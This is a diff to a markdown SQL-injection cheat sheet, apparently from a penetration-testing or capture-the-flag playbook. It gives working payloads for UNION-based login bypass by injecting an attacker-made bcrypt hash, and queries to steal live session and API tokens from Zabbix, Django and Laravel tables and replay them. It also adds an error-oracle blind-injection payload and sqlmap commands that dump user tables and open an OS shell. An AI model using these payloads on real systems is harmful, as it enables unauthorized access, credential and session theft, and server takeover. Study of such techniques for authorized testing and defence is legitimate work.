@@ -114,23 +114,14 @@ Continue until error disappears. See `scenarios/sql/union-based.md`.
 
 ## Hash injection auth bypass (UNION + bcrypt/argon2)
 
-When login fetches a hash and compares via bcrypt:
-1. `' UNION SELECT 1 -- -` → "Invalid salt" confirms hash compare on query result.
-2. Generate hash you control: `python3 -c "import bcrypt; print(bcrypt.hashpw(b'test', bcrypt.gensalt()).decode())"`.
-3. Inject: `' UNION SELECT '$2b$12$YOUR_HASH' -- -` with password=`test`.
+When login fetches the row then compares `hash($password) === $row['password']` in code (UNION returns a row but auth still fails — the PHP compare is the real gate):
+1. `' UNION SELECT 1 -- -` → "Invalid salt"/type error confirms hash compare on the query result.
+2. Generate a hash you control (match the app's algo — bcrypt `python3 -c "import bcrypt;print(bcrypt.hashpw(b'test',bcrypt.gensalt()).decode())"`, or `printf test|sha256sum`).
+3. Inject your hash into the **password column position** of the row (use `ORDER BY` to find column count first): `' UNION SELECT 1,'admin','<hash>' -- -` with password=`test`. `mysqli_fetch_assoc` keys UNION columns by the first SELECT's names, so column order = struct order.
 
 ## Skip password crack — steal active sessions
 
-When SQLi reads `users` with bcrypt hashes, check session tables FIRST:
-
-```sql
-SELECT sessionid FROM sessions WHERE userid=1 AND status=0 ORDER BY lastaccess DESC LIMIT 1;   -- Zabbix
-SELECT session_key FROM django_session WHERE expire_date > NOW();                              -- Django
-SELECT id FROM oauth_access_tokens WHERE user_id=1 AND revoked=0;                              -- Laravel Passport
-SELECT token FROM personal_access_tokens WHERE tokenable_id=1;                                 -- Laravel Sanctum
-```
-
-Replay as `Cookie: <name>=<token>`, `Authorization: Bearer <token>`, or `X-Auth-Token: <token>`.
+When SQLi reads `users` with bcrypt hashes, check session/token tables FIRST: Zabbix `sessions(sessionid,status=0)`, Django `django_session(session_key, expire_date>NOW())`, Laravel Passport `oauth_access_tokens(revoked=0)` / Sanctum `personal_access_tokens`. Replay as `Cookie: <name>=<token>`, `Authorization: Bearer <token>`, or `X-Auth-Token: <token>`.
 
 ## Blind boolean
 
@@ -158,6 +149,10 @@ AND IF((SELECT column FROM table LIMIT 0,1) LIKE 0x61%, sleep(3), 0)
 
 Hex LIKE patterns avoid quote escaping issues.
 
+## Conditional-error oracle (no verbose error text, no content diff)
+
+When the only observable is a generic warning emitted whenever the query *fails* (e.g. `mysqli_num_rows() ... boolean given`), turn any boolean into a failure: `admin' AND (SELECT IF((<COND>),(SELECT 1 UNION SELECT 2),1))-- -`. True → inner subquery returns 2 rows → query errors → warning present; false → returns `1` → no warning. Binary-search `ascii(substring(...,i,1))` on the warning's presence. Send with `curl -i` and **do not follow redirects** — the warning prints before the `302`, so a redirect-following client (default `requests`) loses it (`allow_redirects=False`).
+
 ## Per-DBMS quick syntax
 
 | | MySQL | PostgreSQL | MSSQL | Oracle |
@@ -184,11 +179,9 @@ See `scenarios/sql/per-dbms-{mysql,postgres,mssql,oracle}.md`.
 ## sqlmap quick wins
 
 ```bash
-sqlmap -u "http://target/?id=1" --batch
-sqlmap -u "http://target/?id=1" --dbs
+sqlmap -u "http://target/?id=1" --batch --dbs
 sqlmap -u "http://target/?id=1" -D dbname -T users --dump
-sqlmap -u "http://target/?id=1" --tamper=space2comment
-sqlmap -u "http://target/?id=1" --os-shell
+sqlmap -u "http://target/?id=1" --tamper=space2comment --os-shell
 sqlmap -r request.txt --batch
 ```
 
